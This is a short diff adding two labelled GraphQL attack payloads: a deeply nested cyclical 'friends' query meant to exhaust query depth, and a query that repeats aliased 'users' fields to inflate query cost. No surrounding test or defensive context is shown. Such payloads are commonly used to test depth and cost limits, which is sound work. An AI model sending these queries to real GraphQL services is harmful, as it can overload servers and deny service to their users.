@@ -1,0 +1,33 @@
+# Payload 1: Depth Exhaustion (Cyclical)
+query {
+  users {
+    friends {
+      friends {
+        friends {
+          friends {
+            friends {
+              friends {
+                name
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+# Payload 2: Cost Exhaustion (Alias Overloading)
+query {
+  a: users { name }
+  b: users { name }
+  c: users { name }
+  d: users { name }
+  e: users { name }
+  f: users { name }
+  g: users { name }
+  h: users { name }
+  i: users { name }
+  j: users { name }
+  # ... repeat 100 times to inflate the cost without increasing depth
+}
